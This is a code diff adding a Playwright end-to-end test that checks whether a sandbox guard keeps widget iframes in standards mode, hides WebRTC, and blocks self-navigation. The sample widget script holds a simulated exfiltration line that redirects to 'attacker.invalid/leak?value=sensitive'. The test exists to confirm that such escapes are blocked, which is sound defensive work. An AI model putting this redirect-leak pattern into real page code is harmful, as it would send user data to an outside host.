@@ -1,6 +1,7 @@
 // Control UI E2E covers the real session-dashboard provider and transcript bridge.
 import { chromium, type Browser } from "playwright";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
+import { injectSandboxDocumentGuard } from "../../../src/agents/sandbox-host.js";
 import {
   canRunPlaywrightChromium,
   installMockGateway,
@@ -81,6 +82,58 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
   afterAll(async () => {
     await browser?.close();
     await server?.close();
+  });
+
+  it("keeps guarded widget documents in standards mode and cancels self-navigation", async () => {
+    const context = await browser.newContext();
+    const page = await context.newPage();
+    const escapeRequests: string[] = [];
+    page.on("request", (request) => {
+      if (request.url().startsWith("https://attacker.invalid/")) {
+        escapeRequests.push(request.url());
+      }
+    });
+    await page.setContent(
+      '<meta http-equiv="Content-Security-Policy" content="default-src &#39;none&#39;; script-src &#39;unsafe-inline&#39;; frame-src &#39;none&#39;"><iframe sandbox="allow-scripts allow-forms"></iframe>',
+    );
+    await page.evaluate(() => {
+      Reflect.set(globalThis, "widgetProbes", []);
+      addEventListener("message", (event) => {
+        (Reflect.get(globalThis, "widgetProbes") as unknown[]).push(event.data);
+      });
+    });
+    const guardedHtml = injectSandboxDocumentGuard(`<!doctype html><html><body><script>
+      parent.postMessage({
+        compatMode: document.compatMode,
+        peerConnection: typeof globalThis.RTCPeerConnection,
+      }, "*");
+      setTimeout(() => {
+        location.href = "https://attacker.invalid/leak?value=sensitive";
+      }, 0);
+    </script></body></html>`);
+    await page.locator("iframe").evaluate((frame, html) => {
+      (frame as HTMLIFrameElement).srcdoc = html;
+    }, guardedHtml);
+    const widgetFrame = await page
+      .locator("iframe")
+      .elementHandle()
+      .then((handle) => handle?.contentFrame());
+    expect(widgetFrame).toBeDefined();
+    await expect
+      .poll(async () =>
+        page.evaluate(
+          () =>
+            Reflect.get(globalThis, "widgetProbes") as Array<{
+              compatMode: string;
+              peerConnection: string;
+            }>,
+        ),
+      )
+      .toEqual([{ compatMode: "CSS1Compat", peerConnection: "undefined" }]);
+    await page.waitForTimeout(250);
+    expect(widgetFrame!.url()).not.toContain("attacker.invalid");
+    expect(escapeRequests).toEqual([]);
+    await context.close();
   });
 
   it("pins Canvas HTML, follows board commands, and persists dock resizing", async () => {
